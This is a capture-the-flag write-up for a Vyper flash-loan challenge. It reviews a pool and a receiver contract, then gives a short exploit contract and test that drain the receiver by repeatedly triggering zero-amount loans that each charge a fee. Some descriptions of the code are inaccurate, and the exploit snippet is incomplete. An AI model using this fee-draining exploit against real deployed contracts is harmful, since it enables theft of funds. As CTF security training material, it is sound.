## 1) Challenge

>{{< admonition quote "Description" >}}
>
>The Flash Receiver contract is a receiver of an ERC20-based flash loan pool. The Flash Pool contract is the ERC20-based flash loan contract. There is a flash fee of ten tokens for each flash loan. Your objective is to drain the Flash Receiver contract.
>
>{{< /admonition >}}

Challenge created by [@jtriley_eth](https://twitter.com/jtriley_eth).


## 2) Code Review

This challenge has two contracts: `FlashReceiver` and `FlashPool`.

`FlashReceiver.vy` contract ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/flash-receiver/FlashReceiver.vy)):
```python

# @version ^0.3.2

"""
@title Flash Loan Receiver Supporting ERC20 Token
@author jtriley.eth
"""

from vyper.interfaces import ERC20

interface Flash_pool:
    def deposit(amount: uint256): nonpayable
    def withdraw(amount: uint256): nonpayable
    def flash_loan(amount: uint256): nonpayable
    def deposits(arg0: address) -> uint256: view
    def token() -> address: view
    def flash_fee() -> uint256: view

token: public(address)

pool: public(address)


@external
def __init__(token: address, pool: address):
    self.token = token
    self.pool = pool


@internal
def _execute_action(amount: uint256):
    pass


@external
def execute(amount: uint256):
    """
    @notice Receives flash loan, executes action, then pays back the flash loan + the fee
    @dev Reverts when caller is not the pool itself.
    """
    assert msg.sender == self.pool, "invalid caller"
    self._execute_action(amount)
    fee: uint256 = Flash_pool(self.pool).flash_fee()
    ERC20(self.token).transfer(self.pool, amount + fee)


@external
def initiate_flash_loan(amount: uint256):
    """
    @notice Initiates flash loan from the pool.
    
    Receiver.initiate_flash_loan -> Pool.flash_loan -> Receiver.execute
    """
    Flash_pool(self.pool).flash_loan(amount)

```

Contract main functions:
- `execute`:
    - checks if the sender is the pool (line `40`), meaning this function can be called only by the pool contract
    - calls the `_execute_action` function (that does nothing) - line `41`
    - retrieves the fee from the pool that is equal to `10 ETH` (line `42`)
    - transfers to the pool contract the amount received as an input plus the fee of `10 ETH` (line `43`)
- `initiate_flash_loan` accepts an amount and calls the `flash_loan` function from the pool contract (line `53`)


`FlashPool.vy` contract ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/flash-receiver/FlashPool.vy)):
```python

# @version ^0.3.2

"""
@title Flash Loan Pool Supporting ERC20 Token
@author jtriley.eth
"""

from vyper.interfaces import ERC20

interface IFlashLoanReceiver:
    def execute(amount: uint256): nonpayable


event Deposit:
    account: indexed(address)
    amount: uint256


event Withdrawal:
    account: indexed(address)
    amount: uint256


deposits: public(HashMap[address, uint256])


flash_fee: public(uint256)


token: public(address)


@external
def __init__(token: address):
    self.token = token
    self.flash_fee = 10000000000000000000


@external
def deposit(amount: uint256):
    """
    @notice Deposits ERC20 token.
    @param amount Amount to deposit.
    @dev Reverts when balance or approval of ERC20 is insufficient.
    """
    ERC20(self.token).transferFrom(msg.sender, self, amount)
    self.deposits[msg.sender] += amount
    log Deposit(msg.sender, amount)


@external
def withdraw(amount: uint256):
    """
    @notice Withdraws ERC20 token.
    @param amount Amount to withdraw.
    @dev Reverts when deposit amount is insufficient.
    """
    self.deposits[msg.sender] -= amount
    ERC20(self.token).transferFrom(self, msg.sender, amount)
    log Withdrawal(msg.sender, amount)


@external
def flash_loan(amount: uint256):
    """
    @notice Executes a flash loan, expects the token to be transferred back before completion.
    @param amount Amount to flash loan.
    @dev Reverts when insufficient balance OR when the amount + flash fee is not paid back.
    """
    balance_before: uint256 = ERC20(self.token).balanceOf(self)

    assert balance_before >= amount, "insufficient balance"

    ERC20(self.token).transfer(msg.sender, amount)
    IFlashLoanReceiver(msg.sender).execute(amount)
    balance_after: uint256 = ERC20(self.token).balanceOf(self)
    assert balance_after >= balance_before + self.flash_fee, "not paid back"

```


Contract main functions:
- `deposit` transfers the amount requested to the sender (line `46`) and updates the `deposits` variable by incrementing the amount for the sender (line `47`)
- `withdraw` decrements the `deposit` variable with the amount requested for the sender (line `58`) and transfer the amount to the pool (line `59`)
- `flash_loan`:
    - checks if the pool has enough balance for the loan (line `72`)
    - transfers the amount requested to the sender (line `74`)
    - calls the `execute` function from the receiver contract (line `75`)
    - finally, it checks if the loan plus the fee has been paid back (lines `76-77`)

Anyone can call this function, and there are no checks on the flash loan amount.

Every time the `initiate_flash_loan` function is called, the receiver contract has to pay back the loan plus the additional `10 ETH` fee. However, even if the `execute` function can be called only by the `pool` contract, anyone can call the `initiate_flash_loan` function. Also, there are no checks on the amount in the `execute` function, meaning the receiver can pay `10 ETH` fee even for a `0` loan request.

It means that if we call the `initiate_flash_loan` function multiple times with a `0` amount, the receiver will pay `10 ETH` each time. Since the pool has `100 ETH`, if we call the `initiate_flash_loan` function `10` times, we will drain all its tokens.


## 3) Solution
The solution consists of calling the `initiate_flash_loan` function `10` times with a `0` amount.
`flash-receiver.challenge.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE
        
        let exploit = await (await ethers.getContractFactory('FlashReceiverExploit', deployer)).deploy(this.receiver.address)

        await exploit.connect(attacker).run();

    })

```

`FlashReceiverExploit.vy`:
```python

# YOUR EXPLOIT HERE
@external
def run():
    for _ in range(10):
        Flashreceiver(self.target).initiate_flash_loan(0)

```

You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/flash-receiver.challenge.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/FlashReceiverExploit.vy).
